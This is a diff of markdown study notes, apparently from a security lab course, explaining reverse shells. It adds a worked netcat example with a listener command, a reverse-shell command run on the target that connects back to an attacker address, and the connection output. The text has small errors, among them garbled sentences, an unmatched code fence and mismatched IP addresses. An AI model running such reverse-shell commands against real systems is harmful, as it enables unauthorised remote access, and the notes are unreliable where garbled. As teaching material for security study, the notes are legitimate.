@@ -41,22 +41,40 @@
 
 ## Types of Shell
 ### Reverse shells
-* This is where the target is forced to execute code that connects back to the attacking computer.
-* On the attacking computer you would use one of the tools mentioned above to set up a listener which would be used to receive the connection.
-* Reverse shells are a good way to bypass firewall rules that may prevent you from connecting to arbitrary ports on the target.
-* However, the drawback is that, when receiving a shell from a machine across the internet, you would need to configure your own network to accept the shell.
-* As a general rule, reverse shells are easier to execute and debug.
+* Target is forced to execute code that connects back to the attacking.
+* Attacker would set up a listener that would be used to receive the connection.
+* Reverse shells are a good way to bypass firewall rules that may prevent connecting to arbitrary ports on the target.
+  * Attacker needs to configure their own network to accept the shell when receiving a shell from a machine across the internet the .
+* Reverse shells are generally easier to execute and debug.
 
 #### Reverse Shell Example:
-* On the left we have a reverse shell listener -- this is what receives the connection.
-* On the attacking machine: sudo nc -lvnp 443
-* On the right is a simulation of sending a reverse shell.
-* On the target: nc 10.11.12.223 443 -e /bin/bash
-* In reality, this is more likely to be done through code injection on a remote website or something along those lines.
-* Picture the image on the left as being your own computer, and the image on the right as being the target.
-* Notice that after running the command on the right, the listener receives a connection.
-* When the whoami command is run, we see that we are executing commands as the target user.
-* The important thing here is that we are listening on our own attacking machine, and sending a connection from the target.
+* Reverse shell listener is what receives the connection.
+```
+muri@augury:~$ whoami
+muri
+```
+* Set up the listener on the attacking machine.
+  * *Listening* on the attacking machine.
+```
+muri@augury:~$ sudo nc -lvnp 443
+listening on [any] 443 ...
+```
+* Send a reverse shell from the target.
+  * Connection is sent *from* the target. 
+  * This is likely to be done through code injection.
+```
+shell@linux-shell-practice:~$ nc 10.11.12.223 443 -e /bin/bash
+```
+* Listener receives the connection.
+```
+connect to [10.11.22.223] from (UNKNOWN) [10.10.199.58] 43286
+```
+```
+* Commands run over the shell are executed as the target user.
+```
+whoami
+shell
+```
 
 ### Bind shells
 * This is where the code executed on the target is used to start a listener attached to a shell directly on the target.
